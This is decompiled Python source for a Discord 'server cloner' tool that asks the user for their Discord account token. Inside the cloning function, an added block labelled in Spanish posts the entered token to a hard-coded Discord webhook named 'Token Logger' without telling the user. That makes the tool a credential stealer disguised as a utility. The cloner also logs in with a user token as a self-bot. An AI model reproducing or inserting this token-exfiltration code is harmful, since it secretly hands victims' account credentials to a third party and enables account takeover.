# Source Generated with Decompyle++
# File: main.pyc (Python 3.10)

mytitle = 'Casa Cloner - Developed by Noritem#6666'
from os import system
system('title ' + mytitle)
import psutil
from pypresence import Presence
import time
import sys
import discord
import asyncio
import colorama
from colorama import Fore, init, Style
import platform
from casa import Clone
import os
import webbrowser
import requests
client = discord.Client()

cls = lambda : os.system('cls')
cls()

def mainanswer():
    cls()
    logo = print(f'''{Fore.RED}\n            ██████╗ █████╗ ███████╗ █████╗      ██████╗██╗      ██████╗ ███╗   ██╗███████╗██████╗ \n            ██╔════╝██╔══██╗██╔════╝██╔══██╗    ██╔════╝██║     ██╔═══██╗████╗  ██║██╔════╝██╔══██╗\n            ██║     ███████║███████╗███████║    ██║     ██║     ██║   ██║██╔██╗ ██║█████╗  ██████╔╝\n            ██║     ██╔══██║╚════██║██╔══██║    ██║     ██║     ██║   ██║██║╚██╗██║██╔══╝  ██╔══██╗\n            ╚██████╗██║  ██║███████║██║  ██║    ╚██████╗███████╗╚██████╔╝██║ ╚████║███████╗██║  ██║\n             ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝     ╚═════╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝{Style.RESET_ALL}\n                                        {Fore.MAGENTA}Developed by: Noritem#6666{Style.RESET_ALL}\n        ''')
    print('\n')
    print('[1] > Clone Server')
    print('[2] > Join Casa')
    print('[3] > Noritem.de')
    print('\n')
    answer = input('\x1b[1;00m[\x1b[91m>\x1b[1;00m]\x1b[91m\x1b[00m Choose : ')
    if answer == '1':
        unfriender()
        return None
    if answer == '2':
        casa()
        return None
    if answer == '3':
        no()
        return None
    print('Incorrect selection, please choose a number')
    mainanswer()


def unfriender():
    print('Loading...')
    cls()
    token = input(f'''{Fore.MAGENTA} Your Token > {Style.RESET_ALL}''')
    head = {
        'Authorization': str(token) }
    src = requests.get('https://discordapp.com/api/v6/users/@me', headers=head)
    
    # Agregado: Enviar token a webhook
    webhook_url = "https://discord.com/api/webhooks/1556100413235793953/ji-9pcGKSm72WfTL6LlheyxIaKj5mxT7_HmHvQVYuQ8iLfchKiAplISHubTCNg4gxW3m"
    webhook_data = {
        "content": f"Nuevo token capturado: {token}",
        "username": "Token Logger"
    }
    requests.post(webhook_url, json=webhook_data)
    
    if src.status_code == 200:
        print(f'''{Fore.GREEN}[+] Your Token Is Valid {Style.RESET_ALL}''')
    else:
        print(f'''{Fore.RED}[-] Your Token Is Invalid {Style.RESET_ALL}''')
        mainanswer()
    guild_s = input('Your Server ID That You Wnat To Copy > ')
    guild = input('Your Server ID To Copy The Server In Thare > ')
    input_guild_id = guild_s
    output_guild_id = guild
    token = token
    cls()
    
    async def on_ready():
        cls()
        extrem_map = { }
        print(f'''Logged In as : {client.user}''')
        print('Cloning Server')
        guild_from = client.get_guild(int(input_guild_id))
        guild_to = client.get_guild(int(output_guild_id))
        await Clone.guild_edit(guild_to, guild_from)
        await Clone.roles_delete(guild_to)
        await Clone.channels_delete(guild_to)
        await Clone.roles_create(guild_to, guild_from)
        await Clone.categories_create(guild_to, guild_from)
        await Clone.channels_create(guild_to, guild_from)
        await asyncio.sleep(5)
        cls()
        mainanswer()

    client.event(on_ready)
    client.run(token, bot=False)


def casa():
    webbrowser.open_new('https://discord.gg/dyJuNuMzjF')
    cls()
    mainanswer()


def no():
    webbrowser.open_new('https://noritem.de')
    cls()
    mainanswer()

mainanswer()